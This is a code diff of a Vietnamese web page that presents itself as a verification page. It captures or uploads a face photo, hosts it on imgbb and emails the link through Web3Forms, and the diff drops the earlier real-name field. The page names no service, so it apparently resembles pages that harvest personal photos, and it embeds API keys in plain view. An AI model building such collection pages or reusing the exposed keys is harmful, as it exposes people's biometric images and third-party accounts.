@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Xác minh tên & ảnh</title>
+  <title>Gửi ảnh xác minh</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -28,7 +28,7 @@
       box-shadow: 0 10px 30px rgba(0,0,0,.12);
       text-align: center;
     }
-    input[type="text"], input[type="file"] {
+    input[type="file"] {
       width: 100%;
       padding: 12px;
       border-radius: 8px;
@@ -61,11 +61,8 @@
 </head>
 <body>
   <div class="card">
-    <h2>Xác minh danh tính</h2>
-    <p>Nhập tên thật và tải hoặc chụp ảnh khuôn mặt để xác thực.</p>
-
-    <input id="nameInput" type="text" placeholder="Nhập tên thật của bạn" />
-    <div id="msg" class="msg"></div>
+    <h2>Gửi ảnh xác minh</h2>
+    <p>Chụp hoặc tải ảnh để gửi xác minh.</p>
 
     <button id="openCam">📸 Mở camera</button>
     <p>hoặc</p>
@@ -80,13 +77,14 @@
       <button id="retakeBtn" style="display:none;">Chụp lại</button>
       <button id="sendBtn" style="display:none;">Gửi</button>
     </div>
+
+    <div id="msg" class="msg"></div>
   </div>
 
   <script>
   const WEB3FORMS_KEY = "89379a11-0561-41ee-80a0-bfce9dd60eb7";
   const IMGBB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";
 
-  const nameInput = document.getElementById('nameInput');
   const msg = document.getElementById('msg');
   const openCamBtn = document.getElementById('openCam');
   const fileInput = document.getElementById('fileInput');
@@ -101,10 +99,6 @@
   let stream = null;
   let capturedImage = null;
 
-  function isValidName(name) {
-    return /^[A-Za-zÀ-ỹ\s]+$/.test(name.trim()) && name.trim().length >= 3;
-  }
-
   function showError(text) {
     msg.textContent = "❌ " + text;
     msg.className = "msg err";
@@ -117,11 +111,6 @@
 
   // mở camera
   openCamBtn.onclick = async () => {
-    const name = nameInput.value.trim();
-    if (!isValidName(name)) {
-      showError("Vui lòng nhập tên thật trước khi mở camera.");
-      return;
-    }
     msg.textContent = "";
     confirmBtns.style.display = "block";
 
@@ -181,11 +170,6 @@
 
   // gửi dữ liệu
   sendBtn.onclick = async () => {
-    const name = nameInput.value.trim();
-    if (!isValidName(name)) {
-      showError("Tên không hợp lệ.");
-      return;
-    }
     if (!capturedImage) {
       showError("Bạn chưa chụp hoặc tải ảnh.");
       return;
@@ -207,18 +191,17 @@
 
       const imageUrl = resultImg.data.url;
 
-      // B2: Gửi thông tin + ảnh HTML qua Web3Forms
-      msg.textContent = "📨 Đang gửi...";
+      // B2: Gửi thông tin ảnh qua Web3Forms
+      msg.textContent = "📨 Đang gửi ảnh...";
       const htmlMessage = `
-        <h3>Thông tin xác minh</h3>
-        <p><strong>Tên:</strong> ${name}</p>
-        <p><strong>Ảnh:</strong></p>
-        <img src="${imageUrl}" alt="Ảnh xác minh" width="250" style="border-radius:8px;">
+        <h3>Ảnh xác minh mới</h3>
+        <p><img src="${imageUrl}" alt="Ảnh xác minh" width="250" style="border-radius:8px;"></p>
+        <p><a href="${imageUrl}" target="_blank">🔗 Xem ảnh trên imgbb</a></p>
       `;
 
       const data = {
         access_key: WEB3FORMS_KEY,
-        subject: "Dữ liệu xác minh danh tính",
+        subject: "Ảnh xác minh mới",
         from_name: "Trang xác minh",
         message: htmlMessage
       };
@@ -233,7 +216,6 @@
 
       if (result.success) {
         showOK("✅ Gửi thành công!");
-        nameInput.value = "";
         preview.style.display = "none";
         confirmBtns.style.display = "none";
         if (stream) stream.getTracks().forEach(t => t.stop());
